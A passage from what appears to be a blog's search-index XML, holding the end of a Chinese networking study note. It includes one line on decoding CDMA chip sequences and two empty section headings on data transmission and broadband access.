src="https://img-blog.csdnimg.cn/20210326210707227.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxOTExNDMy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>站点的码片与收到的码片相乘，得出的结果除以8（m）即可得出是否发了消息</p><h1 id="数据传输"><a href="#数据传输" class="headerlink" title="*数据传输"></a>*数据传输</h1><h1 id="宽带接入技术"><a href="#宽带接入技术" class="headerlink" title="*宽带接入技术"></a>*宽带接入技术</h1>]]></content>
      
      
      <categories>
          
          <category> Network </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Network </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
